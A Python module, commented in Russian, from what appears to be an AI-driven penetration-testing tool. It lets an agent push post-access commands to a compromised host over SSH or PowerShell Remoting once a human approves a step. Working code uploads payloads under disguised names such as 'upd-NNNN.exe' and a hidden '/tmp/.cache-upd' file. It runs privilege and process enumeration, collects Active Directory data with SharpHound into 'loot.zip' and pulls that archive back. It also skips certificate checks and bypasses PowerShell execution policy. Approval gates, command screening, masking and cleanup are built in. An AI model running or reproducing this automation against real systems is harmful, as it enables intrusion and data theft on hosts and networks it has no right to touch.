# -*- coding: utf-8 -*-
"""Транспорт внутрь: команды на объект отправляет агент, а не оператор руками.

Решение оператора (06.10.2026): «он сам отправляет». До этого внутренние шаги
готовили текст, который человек копировал в свой терминал. Теперь те же команды
уходят на хост сами — но по тем же правилам, что и раньше, и правила проверяет
код:

* **соединение всегда открываем мы** (§26.2). Никаких обратных соединений,
  слушателей и агентов, ждущих подключения: SSH-клиент, PowerShell Remoting.
  Туннели и проброс портов по-прежнему запрещены — это канал, а не транспорт;
* **один шаг — один хост — одно одобрение.** Отправка бывает только у шага со
  статусом «одобрен человеком»; шаг с несколькими хостами отклоняется, а не
  «уточняется по ходу»;
* **каждая команда проходит ворота заново** — на отправке, а не только на
  предложении: условия шага живут в базе и могли измениться;
* **секрет не сохраняется нигде.** Он приходит на время отправки (окружение или
  поле в панели) и не попадает ни в базу, ни в журнал, ни в текст ошибки. Если
  он всё же мелькнул в выводе чужой команды — вырезается;
* **уборка — в том же шаге и на том же соединении** (§26.2): положили файл,
  отработали, убрали. Файл, который остался на хосте, обязан быть и в пакете
  передачи — иначе он остаётся молча.

Чего транспорт НЕ делает:

* не эксплуатирует: он не «входит» — он работает по уже полученному доступу,
  запись о котором лежит в пакете передачи (`handover access`);
* не поднимает канал и не переживает разрыв: нет соединения — нет работы;
* не подменяет решение человека: без одобренного шага команды не уходят.

Настройки: `ASM_INWARD=on|off` (по умолчанию `on`; `off` возвращает прежнее
поведение «готовим текст»), `ASM_INWARD_METHOD=auto|winrm|ssh`,
`ASM_INWARD_KEY` (файл ключа для SSH), `ASM_INWARD_PORT`, `ASM_INWARD_TIMEOUT`,
`ASM_INWARD_PULL=1` (разрешить забирать с хоста файлы, которые шаг создал, —
нужно для сбора AD), `ASM_INWARD_SECRET` (пароль на время отправки).
"""
from __future__ import annotations

import base64
import json
import os
import re
import shutil
import subprocess
import tempfile
import time

from . import aiagent, engines, gate, store
from .settings import current_settings

MODE = (os.environ.get("ASM_INWARD") or "on").strip().lower()
METHOD = (os.environ.get("ASM_INWARD_METHOD") or "auto").strip().lower()
KEY = (os.environ.get("ASM_INWARD_KEY") or "").strip()
PORT = (os.environ.get("ASM_INWARD_PORT") or "").strip()
TIMEOUT = int(os.environ.get("ASM_INWARD_TIMEOUT") or "180")
PULL = (os.environ.get("ASM_INWARD_PULL") or "0").strip() in ("1", "on", "true", "yes")
OUT_LIMIT = 7000

# Секрет живёт только в памяти процесса и только на время отправки. Так его не
# достать из истории команд, из базы и из журнала аудита.
_SECRET = ""


def _config_value(name: str, default=None):
    snapshot = current_settings()
    if snapshot is not None:
        return snapshot.get(name, default)
    legacy = {
        "ASM_INWARD": MODE,
        "ASM_INWARD_METHOD": METHOD,
        "ASM_INWARD_PORT": PORT,
        "ASM_INWARD_TIMEOUT": TIMEOUT,
        "ASM_INWARD_PULL": PULL,
    }
    return legacy.get(name, os.environ.get(name, default))


def set_secret(secret: str) -> None:
    global _SECRET
    _SECRET = secret or ""


def secret_from_env() -> str:
    return os.environ.get("ASM_INWARD_SECRET", "")


def enabled() -> bool:
    mode = str(_config_value("ASM_INWARD", MODE) or "on").strip().lower()
    return mode not in ("off", "0", "no", "false")


def _pull_enabled() -> bool:
    value = _config_value("ASM_INWARD_PULL", PULL)
    if type(value) is bool:
        return value
    return str(value or "").strip().lower() in ("1", "on", "true", "yes")


# ------------------------------------------------------------- что чем делаем
def have(binary: str) -> str:
    return shutil.which(binary) or ""


def method_for(os_name: str) -> str:
    """Каким способом идём на хост. Пусто — идти нечем (причина отдельно)."""
    win = str(os_name or "").strip().lower().startswith("win")
    method = str(_config_value("ASM_INWARD_METHOD", METHOD) or "auto").strip().lower()
    if method == "ssh":
        return "ssh" if have("ssh") else ""
    if method in ("winrm", "psrp"):
        return "winrm" if have("powershell") else ""
    # auto: Windows — родной PowerShell Remoting (ничего не ставим, отпечаток
    # Microsoft), Linux — OpenSSH. Это и есть приоритет из §26.4.
    if win:
        return "winrm" if have("powershell") else ("ssh" if have("ssh") else "")
    return "ssh" if have("ssh") else ""


def why_no_method(os_name: str) -> str:
    win = str(os_name or "").strip().lower().startswith("win")
    if win:
        return ("для Windows нужен PowerShell (winrm) — на этой машине его не видно; "
                "иначе укажите ASM_INWARD_METHOD=ssh и поставьте OpenSSH-сервер на хосте")
    return ("для Linux нужен клиент ssh — его не видно в PATH; "
            "установите OpenSSH (на Windows — компонент «Клиент OpenSSH»)")


def needs_secret(method: str) -> bool:
    """Нужен ли пароль: для winrm — всегда, для ssh — если нет ключа."""
    if method == "winrm":
        return True
    return not KEY


# ---------------------------------------------------------------- сами команды
def _remote_path(win: bool, step_id: int = 0) -> str:
    """Имя файла на хосте: одно на шаг, своё для уборки.

    Не шаблон с «<цифры>», а конкретное имя: файл кладём мы сами, и убрать
    должны ровно его. Шаблон в записи об уборке — это запись, по которой
    убрать нельзя.
    """
    tag = f"{int(step_id):04d}"[:4] or "0000"
    if win:
        return "C:\\Windows\\Temp\\upd-%s.exe" % tag
    return "/tmp/.cache-upd-%s" % tag


WHOAMI_LINUX = ["id", "hostname", "uname -a", "sudo -n -l 2>/dev/null || true",
                "cat /etc/os-release 2>/dev/null"]
WHOAMI_WIN = ["whoami /all", "hostname", "ipconfig /all",
              "systeminfo | Select-String 'Domain','OS Name','OS Version'",
              "whoami /groups"]


def run_commands_for(action_id: str, os_name: str, remote: str = "") -> list[str]:
    """Чем шаг работает на хосте, если модель команд не написала."""
    win = str(os_name or "").strip().lower().startswith("win")
    timeout = int(_config_value("ASM_INWARD_TIMEOUT", TIMEOUT) or TIMEOUT)
    if action_id == "inside_whoami":
        return list(WHOAMI_WIN if win else WHOAMI_LINUX)
    if not remote:
        return []
    if action_id == "inside_privileges":
        return ["sh %s" % remote] if not win else [remote]
    if action_id == "inside_processes":
        return [("timeout %d %s -pfK" % (timeout, remote)) if not win else remote]
    if action_id == "inside_ad_collect":
        if not win:
            return []
        return ["%s -c All --OutputDirectory C:\\Windows\\Temp --ZipFileName loot.zip" % remote]
    return []


def pull_target_for(action_id: str, remote: str, os_name: str = "") -> str:
    """Что шаг забирает обратно (для AD-сбора — выгрузка структуры каталога)."""
    if action_id == "inside_ad_collect":
        return "C:\\Windows\\Temp\\loot.zip"
    return ""


# ------------------------------------------------------------------- проверки
def _screen(cmds: list[str], scope: tuple, host: str) -> tuple[list[str], list[dict]]:
    good, dropped = [], []
    for c in cmds:
        g = gate.check(c, kind="команда", scope=scope, target=host)
        if g["action"] == gate.BLOCK:
            dropped.append({"cmd": c, "reason": g.get("note") or "запрещено воротами"})
        else:
            good.append(c)
    return good, dropped


def _one_host(params: dict) -> tuple[str, str]:
    """Ровно один хост в шаге. Пусто и причина — если их больше или нет вовсе."""
    hosts = []
    for key in ("host", "target", "hosts", "targets"):
        v = params.get(key)
        if isinstance(v, (list, tuple)):
            hosts += [str(x).strip() for x in v if str(x).strip()]
        elif str(v or "").strip():
            hosts.append(str(v).strip())
    hosts = list(dict.fromkeys(hosts))
    if not hosts:
        return "", "в шаге не назван хост"
    if len(hosts) > 1:
        return "", f"в шаге {len(hosts)} хоста — правило «один хост, одно решение»"
    return hosts[0], ""


# --------------------------------------------------------------- запуск команд
def _mask(text: str) -> str:
    out = text or ""
    if _SECRET:
        out = out.replace(_SECRET, "***")
    return out


def _clean(text: str, limit: int = OUT_LIMIT) -> str:
    """Вывод чужой команды — недоверенный текст, и он не должен быть бесконечным."""
    t = aiagent.sanitize(_mask(text), limit=limit)
    return t


def _run(argv: list[str], *, env: dict | None = None, timeout: int | None = None) -> dict:
    """Один вызов процесса. Никаких оболочек: argv списком."""
    t = int(timeout or _config_value("ASM_INWARD_TIMEOUT", TIMEOUT) or TIMEOUT)
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=t,
                           env=env or os.environ.copy())
    except FileNotFoundError as e:
        return {"ok": False, "out": "", "err": f"нет программы: {e.filename}", "code": -1}
    except subprocess.TimeoutExpired:
        return {"ok": False, "out": "", "err": f"нет ответа за {t} с — соединение не удалось "
                                              f"или команда не завершилась", "code": -1}
    except OSError as e:
        return {"ok": False, "out": "", "err": f"{type(e).__name__}: {e}", "code": -1}
    out = (p.stdout or "") + (("\n" + p.stderr) if p.stderr else "")
    return {"ok": p.returncode == 0, "out": out, "err": (p.stderr or "").strip(),
            "code": p.returncode}


# ----------------------------------------------------------------------- SSH
def _ssh_base(host: str, user: str) -> list[str]:
    args = ["ssh", "-o", "StrictHostKeyChecking=accept-new", "-o", "ConnectTimeout=10",
            "-o", "ServerAliveInterval=15", "-o", "ServerAliveCountMax=3"]
    port = str(_config_value("ASM_INWARD_PORT", PORT) or "").strip()
    if port:
        args += ["-p", port]
    if KEY:
        args += ["-o", "BatchMode=yes", "-i", os.path.expanduser(KEY)]
    args.append(("%s@%s" % (user, host)) if user else host)
    return args


def _with_password(argv: list[str]) -> tuple[list[str], str]:
    """Пароль — через sshpass из окружения, никогда в аргументах команды."""
    sp = have("sshpass")
    if not sp:
        return [], ("нет sshpass, а пароль передать больше нечем: положите ключ "
                    "(ASM_INWARD_KEY) или установите sshpass")
    return [sp, "-e"] + argv, ""


def _env_for_ssh() -> dict:
    env = os.environ.copy()
    if _SECRET:
        env["SSHPASS"] = _SECRET
    for var in ("HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy"):
        env.pop(var, None)   # OpenSSH прокси-переменные не понимает — не путаем его
    return env


# --------------------------------------------------------------------- WINRM
_PS_TEMPLATE = r"""$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$sec = ConvertTo-SecureString $env:ASM_INW_PASS -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($env:ASM_INW_USER, $sec)
$opt = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -OperationTimeout 120000 -IdleTimeout 300000
$args = @{ ComputerName = $env:ASM_INW_HOST; Credential = $cred; SessionOption = $opt }
if ($env:ASM_INW_PORT) { $args['Port'] = [int]$env:ASM_INW_PORT }
try { $s = New-PSSession @args } catch { Write-Output ("СОЕДИНЕНИЕ НЕ УСТАНОВЛЕНО: " + $_.Exception.Message); exit 3 }
try {
  if ($env:ASM_INW_FILE) {
    Copy-Item -ToSession $s -Path $env:ASM_INW_FILE -Destination $env:ASM_INW_REMOTE -Force
    Write-Output ("ПЕРЕНЕСЕНО: " + $env:ASM_INW_REMOTE)
  }
  if ($env:ASM_INW_CMDS) {
    $cmds = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:ASM_INW_CMDS)) | ConvertFrom-Json
    foreach ($c in $cmds) {
      Write-Output ("=== " + $c)
      try { Invoke-Command -Session $s -ScriptBlock ([scriptblock]::Create($c)) 2>&1 | Out-String -Width 400 }
      catch { Write-Output ("ОШИБКА: " + $_.Exception.Message) }
    }
  }
  if ($env:ASM_INW_PULL) {
    Copy-Item -FromSession $s -Path $env:ASM_INW_PULL -Destination $env:ASM_INW_LOCAL -Force
    Write-Output ("ЗАБРАНО: " + $env:ASM_INW_LOCAL)
  }
} finally { Remove-PSSession $s }
"""


def _winrm(host: str, user: str, cmds: list[str], *, push_file: str = "", remote: str = "",
           pull_remote: str = "", pull_local: str = "") -> dict:
    ps = have("powershell") or have("pwsh")
    if not ps:
        return {"ok": False, "out": "", "err": why_no_method("windows"), "code": -1}
    env = os.environ.copy()
    env.update({
        "ASM_INW_HOST": host, "ASM_INW_USER": user, "ASM_INW_PASS": _SECRET,
        "ASM_INW_PORT": str(_config_value("ASM_INWARD_PORT", PORT) or "").strip(),
        "ASM_INW_CMDS": base64.b64encode(
            json.dumps(cmds, ensure_ascii=False).encode("utf-8")).decode() if cmds else "",
        "ASM_INW_FILE": push_file, "ASM_INW_REMOTE": remote,
        "ASM_INW_PULL": pull_remote, "ASM_INW_LOCAL": pull_local,
    })
    d = tempfile.mkdtemp(prefix="asm-inw-")
    script = os.path.join(d, "inward.ps1")
    with open(script, "w", encoding="utf-8") as f:
        f.write(_PS_TEMPLATE)
    try:
        return _run([ps, "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", script], env=env)
    finally:
        try:
            shutil.rmtree(d, ignore_errors=True)
        except Exception:  # noqa: BLE001
            pass


# ------------------------------------------------------------------- отправка
def run(action_id: str, params: dict, sess: dict | None = None, *, secret: str = "",
        step_id: int = 0, scope: tuple = ()) -> dict:
    """Отправить команды шага на хост. Возврат: {sent, ok, text, reason}.

    `sent=False` — отправки не было, и в `reason` сказано, почему именно: это не
    отказ ради отказа, а причина, по которой оператор возьмёт команды руками.
    """
    global _SECRET
    keep = _SECRET
    if secret:
        _SECRET = secret
    try:
        return _run_locked(action_id, params, sess or {}, step_id=step_id, scope=scope)
    finally:
        _SECRET = keep


def _run_locked(action_id: str, params: dict, sess: dict, *, step_id: int,
                scope: tuple) -> dict:
    if not enabled():
        return {"sent": False, "ok": False, "text": "",
                "reason": "отправка выключена (ASM_INWARD=off) — команды ниже для ручного запуска"}
    if engines.halt_state():
        return {"sent": False, "ok": False, "text": "",
                "reason": "остановлено кнопкой СТОП"}
    if action_id == "inside_tunnel":
        return {"sent": False, "ok": False, "text": "",
                "reason": ("туннель — это канал внутрь, а не транспорт: по §26.2 "
                           "канал не строим. Шаг остаётся ручным решением оператора")}

    host, why = _one_host(params)
    if why:
        return {"sent": False, "ok": False, "text": "", "reason": why}
    user = str(params.get("user") or "").strip()
    os_name = str(params.get("os") or "").strip()
    win = os_name.lower().startswith("win")

    method = method_for(os_name)
    if not method:
        return {"sent": False, "ok": False, "text": "", "reason": why_no_method(os_name)}
    if needs_secret(method) and not _SECRET:
        return {"sent": False, "ok": False, "text": "",
                "reason": ("нужен пароль доступа: задайте ASM_INWARD_SECRET или введите его "
                           "в поле при выполнении (в базу и журнал он не пишется)")}

    pull_remote_early = pull_target_for(action_id, "", os_name)
    if pull_remote_early and not _pull_enabled():
        return {"sent": False, "ok": False, "text": "",
                "reason": ("сбор AD забирает выгрузку с хоста, а забор файлов выключен: "
                           "разрешите ASM_INWARD_PULL=1 (выгрузка содержит структуру "
                           "каталога и остаётся у нас)")}

    a_places = action_id in ("inside_privileges", "inside_processes", "inside_ad_collect")
    payload = remote = ""
    if a_places:
        from . import agent as agmod
        a = agmod.INTERNAL_BY_ID.get(action_id) or {}
        chosen, pwhy = agmod._payload_for(a, os_name)   # noqa: SLF001 — один выбор файла на проект
        if pwhy:
            return {"sent": False, "ok": False, "text": "", "reason": pwhy.strip()}
        # Каталог полезных файлов — тот же, что у арсенала: один источник правды,
        # иначе транспорт искал бы файл не там, где его положил установщик.
        tools_dir = str(_config_value("ASM_TOOLS_DIR", engines.TOOLS_DIR) or engines.TOOLS_DIR)
        src = os.path.join(tools_dir, "payloads", chosen)
        if not os.path.isfile(src):
            return {"sent": False, "ok": False, "text": "",
                    "reason": (f"файла инструмента «{chosen}» нет в арсенале ({src}). "
                               f"Он ставится установщиком: bash bin/install-tools.sh — "
                               f"без него шаг остаётся ручным")}
        payload = src
        remote = _remote_path(win, step_id)

    cmds = [str(c) for c in (params.get("cmds") or []) if str(c).strip()]
    if not cmds:
        cmds = run_commands_for(action_id, os_name, remote)
    if a_places and not cmds and not payload:
        return {"sent": False, "ok": False, "text": "",
                "reason": "нечего запускать: для этого шага нет команд под названную систему"}
    if a_places and action_id == "inside_ad_collect" and not win:
        return {"sent": False, "ok": False, "text": "",
                "reason": "сбор AD идёт с Windows-хоста (SharpHound): на Linux-хосте не выполняется"}

    good, dropped = _screen(cmds, scope, host)
    if cmds and not good and not payload:
        return {"sent": False, "ok": False, "text": "",
                "reason": "все команды отброшены воротами: "
                          + (dropped[0]["reason"][:140] if dropped else "нет команд")}
    if a_places and not good:
        return {"sent": False, "ok": False, "text": "",
                "reason": "запуск инструмента заблокирован воротами: "
                          + (dropped[0]["reason"][:140] if dropped else "нет команды запуска")}

    pull_remote = pull_target_for(action_id, remote, os_name)
    pull_local_dir = ""
    if pull_remote:
        # Разрешение уже проверено выше; здесь остаётся только место для файла.
        pull_local_dir = os.path.join(os.path.expanduser("~"), ".asm", "loot",
                                      str((sess or {}).get("id") or 0))
        os.makedirs(pull_local_dir, exist_ok=True)

    # --- соединение и работа
    started = time.time()
    store.audit("agent_inward", {"step": step_id, "action": action_id, "host": host,
                                 "user": user, "method": method,
                                 "commands": len(good), "file": os.path.basename(payload or ""),
                                 "pull": bool(pull_remote)})
    if method == "winrm":
        r = _winrm(host, user, good, push_file=payload, remote=remote,
                   pull_remote=pull_remote, pull_local=os.path.join(pull_local_dir,
                                                                    "loot.zip") if pull_remote else "")
    else:
        argv = _ssh_base(host, user)
        env = _env_for_ssh()
        if _SECRET:
            argv, pwhy = _with_password(argv)
            if pwhy:
                return {"sent": False, "ok": False, "text": "", "reason": pwhy}
        out_parts, ok_all, code = [], True, 0
        def _target(path: str) -> str:
            # «пользователь@хост:путь». Хост здесь обязателен: без него scp ищет
            # файл на нашей же машине — и перенос молча уходит не туда.
            who = ("%s@" % user) if user else ""
            return "%s%s:%s" % (who, host, path)

        if payload:
            up = ["scp", "-o", "StrictHostKeyChecking=accept-new"]
            port = str(_config_value("ASM_INWARD_PORT", PORT) or "").strip()
            if port:
                up += ["-P", port]
            if KEY:
                up += ["-i", os.path.expanduser(KEY)]
            up += [payload, _target(remote)]
            if _SECRET:
                sp = have("sshpass")
                up = [sp, "-e"] + up if sp else up
            pr = _run(up, env=env)
            if pr["ok"]:
                out_parts.append("ПЕРЕНЕСЕНО: %s" % remote)
            else:
                return {"sent": True, "ok": False, "text": "",
                        "reason": "файл не перенесён: " + _clean(pr["err"] or pr["out"], 400)}
        for c in good:
            cr = _run(argv + ["--", c], env=env)
            out_parts.append("=== %s\n%s" % (c, _clean(cr["out"], 2500)))
            ok_all = ok_all and cr["ok"]
            code = cr["code"]
        if pull_remote:
            down = ["scp", "-o", "StrictHostKeyChecking=accept-new"]
            port = str(_config_value("ASM_INWARD_PORT", PORT) or "").strip()
            if port:
                down += ["-P", port]
            if KEY:
                down += ["-i", os.path.expanduser(KEY)]
            down += [_target(pull_remote), pull_local_dir]
            if _SECRET:
                sp = have("sshpass")
                down = [sp, "-e"] + down if sp else down
            dr = _run(down, env=env)
            out_parts.append("ЗАБРАНО: %s" % (pull_local_dir if dr["ok"] else
                                              _clean(dr["err"], 300)))
            ok_all = ok_all and dr["ok"]
        r = {"ok": ok_all, "out": "\n".join(out_parts), "err": "", "code": code}

    text = _clean(r["out"])
    if not text.strip():
        text = ("Хост ответил пусто. Это не «всё хорошо»: команды выполнены, но вывода нет — "
                "проверьте вручную или пришлите вывод.") if r["ok"] else \
               ("Ответа нет. Причина: " + _clean(r["err"] or "соединение не установлено", 300))
    if dropped:
        text += ("\n\nОтброшено воротами (не отправлено): "
                 + "; ".join(d["cmd"][:60] for d in dropped[:3]))

    # --- уборка и записи
    if a_places and payload and r.get("ok") is not None:
        cleanup_done = False
        try:
            from . import handover
            pid = handover.add_placed(int((sess or {}).get("id") or 0), file=os.path.basename(payload),
                                      host=host, path=remote)
        except Exception:  # noqa: BLE001 — запись не должна ронять шаг
            pid = 0
        # Уборка тем же соединением и в том же шаге: rm сразу после работы.
        rm_cmd = ("Remove-Item -Force %s" % remote) if win else ("rm -f %s" % remote)
        if method == "winrm":
            cr = _winrm(host, user, [rm_cmd])
        else:
            argv = _ssh_base(host, user)
            if _SECRET:
                argv, _w = _with_password(argv)
            cr = _run(argv + ["--", rm_cmd], env=_env_for_ssh())
        cleanup_done = bool(cr.get("ok")) and "не убран" not in (cr.get("out") or "")
        try:
            if pid:
                from . import handover
                handover.mark_removed(pid, "убрано транспортом в том же шаге" if cleanup_done
                                      else "уборка не подтверждена — проверить вручную")
        except Exception:  # noqa: BLE001
            pass
        text += ("\n\nУборка: файл %s %s" % (remote, "убран" if cleanup_done
                                             else "НЕ подтверждён — проверить вручную"))
        store.audit("agent_inward_cleanup", {"step": step_id, "host": host, "path": remote,
                                             "ok": cleanup_done})

    took = round(time.time() - started, 1)
    store.audit("agent_inward_done", {"step": step_id, "host": host, "method": method,
                                      "ok": bool(r.get("ok")), "секунд": took,
                                      "команд_выполнено": len(good)})
    return {"sent": True, "ok": bool(r.get("ok")), "text": text, "reason": "",
            "commands": len(good), "dropped": dropped, "seconds": took,
            "pull_dir": pull_local_dir or ""}


def status() -> dict:
    """Что транспорт может на этой машине — словами, без догадок."""
    mode = str(_config_value("ASM_INWARD", MODE) or "on").strip().lower()
    method = str(_config_value("ASM_INWARD_METHOD", METHOD) or "auto").strip().lower()
    port = str(_config_value("ASM_INWARD_PORT", PORT) or "").strip()
    timeout = int(_config_value("ASM_INWARD_TIMEOUT", TIMEOUT) or TIMEOUT)
    return {"режим": mode, "способ": method,
            "ssh": bool(have("ssh")), "scp": bool(have("scp")),
            "sshpass": bool(have("sshpass")),
            "powershell": bool(have("powershell") or have("pwsh")),
            "ключ": bool(KEY), "порт": port or "(по умолчанию)",
            "таймаут": timeout, "забор файлов": _pull_enabled(),
            "для Windows": method_for("windows") or "нечем",
            "для Linux": method_for("linux") or "нечем"}
